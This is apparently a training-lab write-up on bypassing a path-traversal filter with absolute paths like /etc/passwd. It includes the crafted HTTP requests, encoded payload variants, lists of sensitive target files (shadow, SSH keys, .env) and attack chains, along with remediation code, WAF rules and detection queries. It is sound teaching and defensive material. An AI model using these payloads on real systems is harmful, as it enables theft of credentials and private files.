# Path Traversal with Absolute Path Bypass Lab Report

**Lab Title:** Bypassing Path Traversal Filters Using Absolute Paths  
**Date:** February 15, 2026  
**Objective:** Exploit a path traversal vulnerability to retrieve `/etc/passwd` by bypassing traversal sequence filters using absolute path specification

---

## Executive Summary

This lab demonstrates a path traversal vulnerability in product image display functionality. While the application implements filters to block common traversal sequences (`../`), it fails to validate absolute file paths. By supplying an absolute path instead of a relative one, the security control is bypassed, allowing unauthorized access to sensitive system files.

**Result:** Successfully retrieved the contents of `/etc/passwd`

---

## Lab Overview

### Vulnerability Description

- **Location:** Product image display functionality
- **Vulnerability Type:** Path Traversal (CWE-22)
- **Filter Bypass Technique:** Absolute path specification
- **Target File:** `/etc/passwd`
- **Severity:** High

### Key Challenge

The application implements a blacklist filter that blocks common directory traversal sequences such as:
- `../`
- `..\`
- `..%2f`
- Other encoded variations

However, it **does not validate absolute paths**, creating an exploitable bypass.

---

## Technical Background

### Understanding Relative vs Absolute Paths

#### Relative Paths
```
Relative to working directory: images/product1.jpg
With traversal: ../../../etc/passwd
```

#### Absolute Paths
```
From root directory: /etc/passwd
From root directory: /var/www/html/index.php
```

### How the Application Works

**Expected Behavior:**
```python
WORKING_DIR = "/var/www/images/"
user_input = "product1.jpg"
full_path = WORKING_DIR + user_input
# Result: /var/www/images/product1.jpg
```

**Vulnerable Behavior:**
```python
WORKING_DIR = "/var/www/images/"
user_input = "/etc/passwd"  # Absolute path
full_path = WORKING_DIR + user_input
# Result: /etc/passwd (absolute path overrides base directory)
```

### Why Absolute Paths Override Base Directories

In most programming languages and operating systems:
```python
os.path.join("/var/www/images/", "/etc/passwd")
# Returns: /etc/passwd (NOT /var/www/images/etc/passwd)
```

The leading `/` indicates an absolute path, which takes precedence over the base directory.

---

## Methodology

### Phase 1: Reconnaissance

#### Step 1.1: Identify the Vulnerability Point

1. Navigate to the lab application
2. Browse product listings
3. Locate product images being displayed
4. Inspect the image URLs

**Typical URL Structure:**
```
https://lab-domain.com/image?filename=product1.jpg
```

**Observations:**
- Parameter name: `filename`
- Parameter value: Image filename (e.g., `product1.jpg`, `product2.png`)
- Display mechanism: Server-side file retrieval

#### Step 1.2: Understand the Filter

**Known Information:**
- Application blocks traversal sequences
- Filename is treated as relative to a default working directory

**Blocked Payloads (Expected):**
```
filename=../../../etc/passwd
filename=..%2f..%2f..%2fetc%2fpasswd
filename=....//....//etc/passwd
```

---

### Phase 2: Exploitation Strategy

#### Step 2.1: Bypassing the Filter

**Insight:** If the application only blocks traversal sequences but allows absolute paths, we can bypass the filter entirely.

**Attack Vector:** Absolute path specification

**Payload:** `/etc/passwd`

#### Step 2.2: Payload Construction

**Original Request:**
```http
GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-lab.com
```

**Modified Request:**
```http
GET /image?filename=/etc/passwd HTTP/1.1
Host: vulnerable-lab.com
```

**URL-Encoded Alternative:**
```http
GET /image?filename=%2fetc%2fpasswd HTTP/1.1
Host: vulnerable-lab.com
```

---

### Phase 3: Execution

#### Step 3.1: Manual Browser Testing

**Method 1: Direct URL Modification**

1. Copy the original image URL:
   ```
   https://lab-domain.com/image?filename=product1.jpg
   ```

2. Modify the filename parameter:
   ```
   https://lab-domain.com/image?filename=/etc/passwd
   ```

3. Navigate to the modified URL in the browser

**Expected Response:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

#### Step 3.2: Using Burp Suite (Alternative Method)

1. **Capture the Request:**
   - Enable Burp Suite proxy interception
   - Click on a product image
   - Intercept the image request

2. **Modify the Request:**
   ```http
   GET /image?filename=product1.jpg HTTP/1.1
   Host: vulnerable-lab.com
   User-Agent: Mozilla/5.0
   Accept: image/webp,*/*
   ```
   
   Change to:
   ```http
   GET /image?filename=/etc/passwd HTTP/1.1
   Host: vulnerable-lab.com
   User-Agent: Mozilla/5.0
   Accept: image/webp,*/*
   ```

3. **Forward the Request:**
   - Click "Forward" in Burp Suite
   - Observe the response in the browser or HTTP history

4. **Verify Success:**
   - Response should contain `/etc/passwd` contents
   - Lab should mark as solved

**Result:** ✓ **Successfully retrieved `/etc/passwd` contents**

---

## Attack Flow Diagram

```
┌──────────────────────────────────────────────────────────┐
│ 1. Identify Image Parameter                             │
│    URL: /image?filename=product1.jpg                     │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ▼
┌──────────────────────────────────────────────────────────┐
│ 2. Understand Filter Mechanism                          │
│    - Blocks: ../                                         │
│    - Treats filename as relative to working dir         │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ▼
┌──────────────────────────────────────────────────────────┐
│ 3. Identify Bypass Technique                            │
│    - Use absolute path instead of relative traversal    │
│    - Payload: /etc/passwd                               │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ▼
┌──────────────────────────────────────────────────────────┐
│ 4. Execute Attack                                        │
│    /image?filename=/etc/passwd                          │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ▼
┌──────────────────────────────────────────────────────────┐
│ 5. Retrieve File Contents ✓                             │
│    Lab Solved                                           │
└──────────────────────────────────────────────────────────┘
```

---

## Technical Analysis

### Filter Bypass Mechanics

#### The Vulnerable Code (Conceptual)

```python
import os
import re

IMAGES_DIR = "/var/www/images/"

def get_image(filename):
    # Security filter (INCOMPLETE)
    if ".." in filename:
        return "Access Denied: Traversal detected"
    
    # Path construction (VULNERABLE)
    file_path = os.path.join(IMAGES_DIR, filename)
    
    # File retrieval
    with open(file_path, 'rb') as f:
        return f.read()

# Normal use:
get_image("product1.jpg")  
# → /var/www/images/product1.jpg ✓

# Blocked attack:
get_image("../../../etc/passwd")  
# → Access Denied ✓

# Successful bypass:
get_image("/etc/passwd")  
# → /etc/passwd ✗ (Security failure!)
```

### Why the Filter Fails

**The filter checks for:**
```python
if ".." in filename:
    return "Access Denied"
```

**But doesn't validate:**
```python
if filename.startswith("/"):
    return "Absolute paths not allowed"
```

### Path Resolution Behavior

**Python Example:**
```python
>>> import os
>>> os.path.join("/var/www/images/", "product1.jpg")
'/var/www/images/product1.jpg'

>>> os.path.join("/var/www/images/", "/etc/passwd")
'/etc/passwd'  # Absolute path overrides base!
```

**PHP Example:**
```php
<?php
$base = "/var/www/images/";
$filename = "/etc/passwd";
$path = $base . $filename;
echo $path;  // Outputs: /var/www/images//etc/passwd

// But when used with realpath or file operations:
realpath($path);  // Resolves to: /etc/passwd
?>
```

**Node.js Example:**
```javascript
const path = require('path');

path.join('/var/www/images/', 'product1.jpg')
// Returns: '/var/www/images/product1.jpg'

path.join('/var/www/images/', '/etc/passwd')
// Returns: '/etc/passwd'
```

---

## Alternative Payloads

### Different Absolute Paths

```
Target: /etc/passwd
Payload: /etc/passwd

Target: /etc/shadow (if permissions allow)
Payload: /etc/shadow

Target: Application config
Payload: /var/www/html/config.php

Target: Web server logs
Payload: /var/log/apache2/access.log
```

### Encoding Variations

```
Standard:
/etc/passwd

URL-encoded:
%2fetc%2fpasswd

Double URL-encoded:
%252fetc%252fpasswd

Unicode encoding:
%u002fetc%u002fpasswd

Mixed encoding:
/%65tc/passwd
```

---

## Security Implications

### Severity Assessment

**CVSS v3.1 Score:** 7.5 (High)
- **Attack Vector (AV):** Network
- **Attack Complexity (AC):** Low
- **Privileges Required (PR):** None
- **User Interaction (UI):** None
- **Scope (S):** Unchanged
- **Confidentiality (C):** High
- **Integrity (I):** None
- **Availability (A):** None

### Impact Analysis

#### 1. Information Disclosure

**Immediate Risks:**
```
/etc/passwd → User enumeration
/etc/group → Group information
/etc/hosts → Network topology
/proc/self/environ → Environment variables
/proc/self/cmdline → Process information
```

#### 2. Credential Exposure

**Potential Targets:**
```
/var/www/html/.env → Database credentials
/home/user/.ssh/id_rsa → SSH private keys
/var/www/html/config/database.yml → App credentials
/root/.bash_history → Command history with passwords
```

#### 3. Application Source Code Access

```
/var/www/html/index.php → Application logic
/var/www/html/admin/auth.php → Authentication code
/var/www/html/includes/db.php → Database connection details
```

#### 4. Log File Access

```
/var/log/apache2/access.log → User activity, session tokens
/var/log/apache2/error.log → Application errors, stack traces
/var/log/auth.log → Authentication attempts
/var/log/mysql/mysql.log → Database queries
```

---

## Real-World Attack Scenarios

### Scenario 1: Complete System Compromise

**Attack Chain:**
```
Step 1: Read /etc/passwd
        └→ Identify valid usernames

Step 2: Read /home/admin/.ssh/id_rsa
        └→ Obtain SSH private key

Step 3: SSH into server
        └→ Full system access
```

### Scenario 2: Database Takeover

**Attack Chain:**
```
Step 1: Read /var/www/html/config.php
        └→ Extract database credentials

Step 2: Connect to database remotely
        └→ Access all application data

Step 3: Extract user data
        └→ Customer PII, payment info
```

### Scenario 3: Session Hijacking

**Attack Chain:**
```
Step 1: Read /var/log/apache2/access.log
        └→ Find session tokens in URLs

Step 2: Use valid session token
        └→ Impersonate legitimate user

Step 3: Access privileged functions
        └→ Administrative access
```

---

## Remediation Recommendations

### Immediate Actions (Priority: HIGH)

#### 1. Implement Whitelist Validation

**Secure Implementation:**
```python
import os
import re

IMAGES_DIR = "/var/www/images/"
ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.webp']

def get_image(filename):
    # Reject absolute paths
    if filename.startswith('/') or filename.startswith('\\'):
        return "Error: Absolute paths not allowed"
    
    # Reject any traversal sequences
    if '..' in filename or filename.count('/') > 0:
        return "Error: Invalid filename"
    
    # Whitelist file extensions
    if not any(filename.lower().endswith(ext) for ext in ALLOWED_EXTENSIONS):
        return "Error: Invalid file type"
    
    # Construct safe path
    file_path = os.path.join(IMAGES_DIR, filename)
    
    # Verify resolved path is within allowed directory
    if not os.path.abspath(file_path).startswith(os.path.abspath(IMAGES_DIR)):
        return "Error: Access denied"
    
    # Additional check: file must exist and be a file
    if not os.path.isfile(file_path):
        return "Error: File not found"
    
    # Read and return file
    with open(file_path, 'rb') as f:
        return f.read()
```

#### 2. Use File ID Mapping Instead of Filenames

**Secure Alternative:**
```python
# Database schema
# files table: id, filename, path, user_id, created_at

def get_image(file_id):
    # Retrieve file info from database
    file_record = database.query(
        "SELECT path FROM files WHERE id = ? AND is_public = 1",
        [file_id]
    )
    
    if not file_record:
        return "Error: File not found"
    
    # Use stored path (never user input)
    file_path = file_record['path']
    
    # Read and return
    with open(file_path, 'rb') as f:
        return f.read()

# Usage: /image?id=123 (not filename)
```

#### 3. Path Canonicalization and Validation

**Python Implementation:**
```python
import os

def safe_path_join(base_dir, user_path):
    # Reject absolute paths
    if os.path.isabs(user_path):
        raise ValueError("Absolute paths not allowed")
    
    # Join paths
    full_path = os.path.join(base_dir, user_path)
    
    # Resolve to canonical path (resolve symlinks, etc.)
    canonical_path = os.path.realpath(full_path)
    canonical_base = os.path.realpath(base_dir)
    
    # Ensure the canonical path is within base directory
    if not canonical_path.startswith(canonical_base + os.sep):
        raise ValueError("Path traversal detected")
    
    return canonical_path
```

**PHP Implementation:**
```php
<?php
function safePathJoin($baseDir, $userPath) {
    // Reject absolute paths
    if ($userPath[0] === '/' || $userPath[0] === '\\') {
        throw new Exception("Absolute paths not allowed");
    }
    
    // Construct path
    $fullPath = $baseDir . DIRECTORY_SEPARATOR . $userPath;
    
    // Get real paths
    $realPath = realpath($fullPath);
    $realBase = realpath($baseDir);
    
    // Validate
    if ($realPath === false || strpos($realPath, $realBase) !== 0) {
        throw new Exception("Invalid path");
    }
    
    return $realPath;
}
?>
```

#### 4. Comprehensive Input Validation

**Validation Checklist:**
```python
def validate_filename(filename):
    # Length check
    if len(filename) > 255:
        return False
    
    # Character whitelist
    allowed_chars = re.compile(r'^[a-zA-Z0-9._-]+$')
    if not allowed_chars.match(filename):
        return False
    
    # No absolute paths
    if filename.startswith('/') or filename.startswith('\\'):
        return False
    
    # No traversal sequences
    if '..' in filename or '/' in filename or '\\' in filename:
        return False
    
    # No null bytes
    if '\x00' in filename:
        return False
    
    # Extension whitelist
    allowed_extensions = ['.jpg', '.jpeg', '.png', '.gif']
    if not any(filename.lower().endswith(ext) for ext in allowed_extensions):
        return False
    
    return True
```

### Long-Term Solutions

#### 1. Web Application Firewall (WAF)

**ModSecurity Rules:**
```apache
# Block absolute paths in file parameters
SecRule ARGS:filename "@rx ^[/\\]" \
    "id:1001,phase:2,deny,status:403,\
    msg:'Absolute path detected in filename parameter'"

# Block traversal sequences
SecRule ARGS:filename "@contains .." \
    "id:1002,phase:2,deny,status:403,\
    msg:'Directory traversal attempt detected'"
```

#### 2. Content Security Policy

```http
Content-Security-Policy: default-src 'self'; img-src 'self' data:
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

#### 3. Least Privilege File Permissions

```bash
# Application should run with minimal permissions
chown www-data:www-data /var/www/images/
chmod 755 /var/www/images/

# Files should be readable only
chmod 644 /var/www/images/*.jpg

# Sensitive files should not be readable by web server
chmod 600 /etc/shadow
chmod 600 /root/.ssh/id_rsa
```

#### 4. Chroot Jails / Containerization

```bash
# Run application in chroot environment
chroot /var/www/app /usr/bin/php-fpm

# Or use Docker containers with limited filesystem access
docker run --read-only -v /var/www/images:/images:ro webapp
```

---

## Detection and Monitoring

### Log Monitoring

**Apache/Nginx Access Logs:**
```bash
# Monitor for suspicious patterns
tail -f /var/log/apache2/access.log | grep -E "(/etc/|/var/|/root/|/proc/)"

# Specific detection
grep "filename=/etc/passwd" /var/log/apache2/access.log
grep "filename=%2fetc%2fpasswd" /var/log/apache2/access.log
```

### SIEM Alert Rules

**Splunk Query:**
```spl
index=web_logs 
| rex field=uri "filename=(?<file_param>[^&]+)"
| where like(file_param, "/%") OR like(file_param, "\\%")
| table _time, src_ip, uri, file_param
| sort -_time
```

**Elastic (ELK) Query:**
```json
{
  "query": {
    "bool": {
      "should": [
        { "wildcard": { "request.uri": "*filename=/*" }},
        { "wildcard": { "request.uri": "*filename=%2f*" }}
      ]
    }
  }
}
```

### Indicators of Compromise (IOCs)

**Suspicious Patterns:**
```
filename=/etc/passwd
filename=/etc/shadow
filename=/var/www/
filename=%2fetc%2f
filename=/root/.ssh/
filename=/proc/
filename=C:\
filename=\\Windows\\
```

---

## Lessons Learned

### Key Takeaways

1. **Blacklist Filters Are Insufficient:**
   - Blocking `../` is not enough
   - Attackers find alternative techniques
   - Absolute paths bypass relative traversal filters

2. **Defense in Depth Required:**
   - Input validation
   - Path canonicalization
   - Directory restriction
   - File permission controls

3. **Secure Coding Principles:**
   - Never trust user input
   - Use whitelist validation over blacklist
   - Implement proper path handling functions
   - Prefer indirect file access (IDs vs filenames)

4. **Testing Methodology:**
   - Always test filter bypass techniques
   - Consider alternative input methods
   - Think like an attacker

### Filter Bypass Techniques Summary

```
Technique 1: Absolute Paths
  Blocked: ../../../../etc/passwd
  Bypass:  /etc/passwd ✓

Technique 2: URL Encoding
  Blocked: ../etc/passwd
  Bypass:  %2e%2e%2fetc/passwd

Technique 3: Double Encoding
  Blocked: ../etc/passwd
  Bypass:  %252e%252e%252f

Technique 4: Unicode/UTF-8
  Blocked: ../etc/passwd
  Bypass:  %u002e%u002e%u002f
```

---

## Conclusion

This lab successfully demonstrated a path traversal vulnerability exploitation by bypassing inadequate input filters. The key insight was recognizing that while the application blocked relative traversal sequences (`../`), it failed to validate absolute file paths.

**Attack Summary:**
- **Vulnerability:** Path traversal in image display
- **Filter Bypass:** Absolute path specification
- **Payload:** `/etc/passwd`
- **Result:** ✓ Successful file retrieval

The vulnerability underscores the critical importance of comprehensive input validation, proper path handling, and defense-in-depth security strategies. Simple blacklist filters are insufficient; applications must implement multiple layers of protection including whitelisting, path canonicalization, and directory confinement.

---

## Appendix A: Quick Reference

### Exploitation Steps

```
1. Locate image parameter
   → URL: /image?filename=product1.jpg

2. Identify bypass technique
   → Use absolute path instead of relative traversal

3. Construct payload
   → Payload: /etc/passwd

4. Execute attack
   → URL: /image?filename=/etc/passwd

5. Verify success
   → Contents of /etc/passwd displayed
```

### Common Target Files

| File Path | Description | Sensitivity |
|-----------|-------------|-------------|
| `/etc/passwd` | User accounts | Medium |
| `/etc/shadow` | Password hashes | Critical |
| `/etc/hosts` | Hostname mappings | Low |
| `/var/www/html/config.php` | App configuration | Critical |
| `/home/user/.ssh/id_rsa` | SSH private key | Critical |
| `/var/log/apache2/access.log` | Web server logs | Medium |
| `/proc/self/environ` | Environment variables | High |

---

## Appendix B: Testing Checklist

- [ ] Identify the vulnerable parameter (filename, file, path, etc.)
- [ ] Test with normal input to understand expected behavior
- [ ] Attempt standard traversal (`../../../etc/passwd`)
- [ ] Observe filter/error response
- [ ] Try absolute path bypass (`/etc/passwd`)
- [ ] Test with URL encoding (`%2fetc%2fpasswd`)
- [ ] Verify file contents are retrieved
- [ ] Document the vulnerability
- [ ] Test additional target files
- [ ] Report findings with remediation recommendations

---

## References

- **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory
- **OWASP:** Path Traversal
- **OWASP Top 10:** A01:2021 – Broken Access Control
- **PortSwigger Web Security Academy:** Path Traversal Labs

---

**Lab Status:** ✓ COMPLETED  
**Target Retrieved:** `/etc/passwd`  
**Bypass Technique:** Absolute Path Specification  
**Vulnerability Severity:** HIGH  
**Remediation Priority:** IMMEDIATE